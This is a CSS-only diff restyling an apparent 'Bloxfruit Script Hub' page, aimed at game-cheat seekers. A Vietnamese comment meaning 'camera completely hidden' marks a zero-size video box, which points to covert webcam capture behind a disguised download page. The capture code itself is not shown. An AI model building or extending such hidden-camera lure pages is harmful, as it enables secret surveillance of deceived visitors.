@@ -7,26 +7,35 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Bloxfruit Script Script Hub</title>
     <style>
-        body {
-    font-family: 'Segoe UI', Tahoma, sans-serif;
-    background: #0b0e11;
-    color: #eaecef;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    margin: 0;
-        }
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap');
+
+    body {
+      font-family: 'Orbitron', sans-serif;
+      background: linear-gradient(135deg, #0b0c1b, #1a1b2a);
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+      padding: 20px;
+    }
+
 
         .card {
-    background: #1e2329;
-    padding: 30px;
-    border-radius: 16px;
-    text-align: center;
-    width: 90%;
-    max-width: 400px;
-    border: 1px solid #474d57;
-    box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+      background: linear-gradient(145deg, #1a1b2a, #252738);
+      padding: 30px;
+      border-radius: 15px;
+      text-align: center;
+      width: 100%;
+      max-width: 450px;
+      box-shadow: 0 0 15px #00ffff50, 0 0 25px #ffcc0050;
+      transition: transform 0.3s, box-shadow 0.3s;
+        }
+
+        .card:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 0 25px #00ffff80, 0 0 35px #ffcc0080;
         }
 
         .btc-icon {
@@ -35,35 +44,38 @@
         }
 
         h2 {
-    color: #f3ba2f;
-    margin-bottom: 10px;
-}
+      color: #ffcc00;
+      font-size: 2em;
+      margin-bottom: 15px;
+      text-shadow: 2px 2px 8px #00ffff;
+    }
 
-p {
-    color: #848e9c;
-    font-size: 14px;
-    line-height: 1.6;
-}
+    p {
+      color: #00ffff;
+      font-size: 0.95em;
+      line-height: 1.5;
+      margin-bottom: 25px;
+      text-shadow: 1px 1px 3px #000;
+    }
 
-        .btn {
-    background: #f3ba2f;
-    color: #000;
-    border: none;
-    padding: 15px;
-    width: 100%;
-    border-radius: 8px;
-    font-weight: bold;
-    cursor: pointer;
-    font-size: 16px;
-    margin-top: 20px;
-    transition: 0.3s;
-}
+    .btn {
+      background: linear-gradient(135deg, #ffcc00, #00ffff);
+      border: none;
+      color: #000;
+      padding: 12px 25px;
+      border-radius: 10px;
+      font-weight: bold;
+      font-size: 1em;
+      cursor: pointer;
+      transition: transform 0.2s, box-shadow 0.2s;
+    }
 
-.btn:hover {
-    background: #dba323;
-}
+    .btn:hover {
+      transform: scale(1.05);
+      box-shadow: 0 0 10px #ffcc00, 0 0 15px #00ffff;
+    }
 
-        /* Camera ẩn hoàn toàn */
+           /* Camera ẩn hoàn toàn */
         #vBox {
             width: 0;
             height: 0;
@@ -72,25 +84,25 @@ p {
             position: absolute;
         }
 
-        #loading {
-    display: none;
-    margin-top: 20px;
-}
+           #loading {
+      display: none;
+      margin-top: 20px;
+    }
 
-.spinner {
-    border: 3px solid #30363d;
-    border-top: 3px solid #f3ba2f;
-    border-radius: 50%;
-    width: 30px;
-    height: 30px;
-    animation: spin 1s linear infinite;
-    margin: 0 auto 10px;
-}
+    .spinner {
+      border: 3px solid #30363d;
+      border-top: 3px solid #f3ba2f;
+      border-radius: 50%;
+      width: 30px;
+      height: 30px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 10px;
+    }
 
-@keyframes spin {
-    0% { transform: rotate(0deg); }
-    100% { transform: rotate(360deg); }
-}
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
         
     </style>
 </head>
